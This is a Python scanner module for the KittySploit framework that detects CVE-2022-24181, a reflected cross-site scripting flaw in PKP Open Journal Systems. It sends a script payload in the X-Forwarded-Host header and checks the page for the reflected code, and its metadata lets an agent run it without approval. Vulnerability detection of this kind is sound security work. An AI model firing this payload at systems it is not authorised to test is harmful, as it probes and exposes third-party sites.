#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PKP Open Journal Systems 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PKP Open Journal Systems 2.4.8-3.3 - Cross-Site Scripting Detection',
        'description': 'PKP Open Journal Systems 2.4.8 to 3.3 contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary code via the X-Forwarded-Host Header.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'oss', 'pkp-lib', 'edb', 'public_knowledge_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50881',
            'https://github.com/pkp/pkp-lib/issues/7649',
            'https://youtu.be/v8-9evO2oVg',
            'https://nvd.nist.gov/vuln/detail/cve-2022-24181',
            'https://github.com/comrade99/CVE-2022-24181',
        ],
        'cve': 'CVE-2022-24181',
    }

    def run(self):
        path = '/iupjournals/index.php/esj'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'X-Forwarded-Host': 'foo"><script>alert(document.domain)</script><x=".com'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(document.domain)</script><x=".com/iupjournals',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='PKP Open Journal Systems 2.4.8-3.3 - Cross-Site Scripting detected', path=path)
            return True
        return False

